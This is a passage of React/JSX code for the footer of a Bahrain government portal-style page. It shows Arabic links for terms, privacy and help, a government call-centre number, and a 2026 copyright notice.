                  <img src="/tawasul-logo.png" alt="تواصل" style={{ height: '55px', objectFit: 'contain' }} />
                  <div>
                    <div className="bh-footer-contact-number">80008001</div>
                    <div className="bh-footer-contact-sub">مركز اتصال الخدمات الحكومية</div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>

        <div className="bh-footer-bottom-links">
          <div className="bh-container">
            <a>شروط الإستخدام</a>
            <span className="separator">|</span>
            <a>سياسة الخصوصية</a>
            <span className="separator">|</span>
            <a>إمكانية الوصول</a>
            <span className="separator">|</span>
            <a>الأسئلة الشائعة</a>
            <span className="separator">|</span>
            <a>مساعدة</a>
            <span className="separator">|</span>
            <a>تواصل معنا</a>
            <span className="separator">|</span>
            <a>خريطة الموقع</a>
          </div>
        </div>

        <div className="bh-footer-copyright">
          <div className="bh-container">
            <p>آخر تحديث على البوابة الوطنية : السبت، 7 مارس 2026</p>
            <p>تم التطوير من قبل <a>هيئة المعلومات والحكومة الإلكترونية</a></p>
            <p>حقوق الطبع &copy; 2026 مملكة البحرين</p>
            <p>جميع الحقوق محفوظة</p>
          </div>
        </div>
      </div>
    </>
  );
}
